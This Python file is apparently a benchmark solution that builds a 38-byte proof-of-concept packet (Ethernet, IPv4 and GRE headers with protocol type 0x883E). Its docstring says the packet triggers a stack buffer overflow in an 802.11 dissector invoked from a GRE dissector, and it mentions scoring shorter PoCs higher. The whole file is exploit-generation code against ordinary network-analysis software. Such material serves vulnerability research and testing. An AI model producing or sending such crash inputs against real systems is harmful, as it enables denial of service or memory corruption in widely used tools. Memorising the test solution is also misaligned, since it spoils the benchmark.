import socket
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in the 802.11 dissector when
        it's invoked as a subdissector by the GRE dissector. The root cause is a
        mismatch in the pseudo-header structure provided by GRE versus what the
        802.11 dissector expects. The 802.11 dissector attempts to read radio
        information from a pseudo-header that is much smaller than expected,
        leading to reading uninitialized data from the stack. This data, when
        used as a length for a memory copy, can cause a stack buffer overflow.

        The PoC is a minimal packet that triggers this specific dissection path:
        Ethernet -> IP -> GRE -> 802.11.
        1. An Ethernet header is used for link-layer framing.
        2. An IP header with protocol number 47 (GRE) encapsulates the GRE packet.
        3. A GRE header with protocol type 0x883E (WCCP) is used. In vulnerable
           versions of the target, this protocol type is registered to be handled
           by the 802.11 dissector.
        4. No payload is necessary after the GRE header, as the vulnerability is
           triggered during header processing before the payload is deeply inspected.
           This results in a shorter PoC and a higher score.

        The total length is 14 (Ethernet) + 20 (IP) + 4 (GRE) = 38 bytes.
        """
        
        # Ethernet Header (14 bytes)
        eth_header = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00'

        # IPv4 Header (20 bytes)
        ip_ver_ihl = 0x45
        ip_dscp_ecn = 0x00
        ip_total_len = 24  # 20 (IP) + 4 (GRE)
        ip_id = 1
        ip_flags_offset = 0x4000  # Don't Fragment
        ip_ttl = 64
        ip_proto = 47  # GRE
        ip_src = socket.inet_aton('127.0.0.1')
        ip_dst = socket.inet_aton('127.0.0.1')

        # Temporarily create the IP header with a zero checksum to calculate the correct one.
        ip_header_no_checksum = struct.pack(
            '!BBHHHBBH4s4s',
            ip_ver_ihl, ip_dscp_ecn, ip_total_len,
            ip_id, ip_flags_offset, ip_ttl,
            ip_proto, 0, ip_src, ip_dst
        )

        def calculate_checksum(data: bytes) -> int:
            s = 0
            # Handle odd-length data
            if len(data) % 2:
                data += b'\0'
            
            # Sum all 16-bit words
            for i in range(0, len(data), 2):
                w = (data[i] << 8) + data[i+1]
                s += w
            
            # Add carry-overs
            s = (s >> 16) + (s & 0xffff)
            s += s >> 16
            
            # Return one's complement
            return (~s) & 0xffff

        ip_checksum_val = calculate_checksum(ip_header_no_checksum)

        # Construct the final IP header with the correct checksum.
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            ip_ver_ihl, ip_dscp_ecn, ip_total_len,
            ip_id, ip_flags_offset, ip_ttl,
            ip_proto, ip_checksum_val, ip_src, ip_dst
        )
        
        # GRE Header (4 bytes)
        # Protocol Type 0x883E (WCCP) is the key to trigger the 802.11 dissector.
        gre_header = b'\x00\x00\x88\x3e'
        
        # An empty payload is sufficient.
        payload = b''
        
        poc = eth_header + ip_header + gre_header + payload
        
        return poc
